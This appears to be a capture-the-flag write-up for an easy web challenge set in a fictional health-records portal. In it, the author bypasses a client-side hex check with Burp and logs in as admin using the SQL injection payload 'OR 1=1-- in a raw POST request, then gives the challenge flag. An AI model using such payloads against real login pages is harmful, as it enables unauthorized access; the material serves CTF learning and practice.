---
title: Utopia Health Records System
tags:
  - Web
  - SQLi
Difficulty: Easy
category: Web
---
### Description
Utopia Smart City has deployed a new Electronic Health Records system for its residents. The public portal provides information about healthcare services, but there might be more to discover. Can you find and access the admin dashboard to retrieve the system access token?

### Solution

The admin login page was in robots.txt:

`https://3a3d5f9ea6906b26.chal.ctf.ae/admin/login.php`

The admin portal required the username and the password in hexadecimal. Initially, I thought the solution would be to brute force the password. After trying a few simple combinations like admin (61646d696e in hex), I did not get anywhere. I found strange the requirement of the password being in hex format, so I tried to search for vulnerabilities instead. The requirement of the password string being in hex was only enforced client side, so I used burp to intercept the request and then the following SQLi payload worked to log in:

```
POST /admin/login.php HTTP/1.1
Host: f3f22faa6b5ae2e2.chal.ctf.ae
Cookie: PHPSESSID=08cd62ae5a79d0cfa0bed89fc00f9d56
Content-Length: 34
Origin: https://f3f22faa6b5ae2e2.chal.ctf.ae
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://f3f22faa6b5ae2e2.chal.ctf.ae/admin/login.php
Connection: keep-alive

username=admin&password='OR+1=1--+
```


![[Pasted image 20251025132505.png]]

flag{29d83732500f2ae2}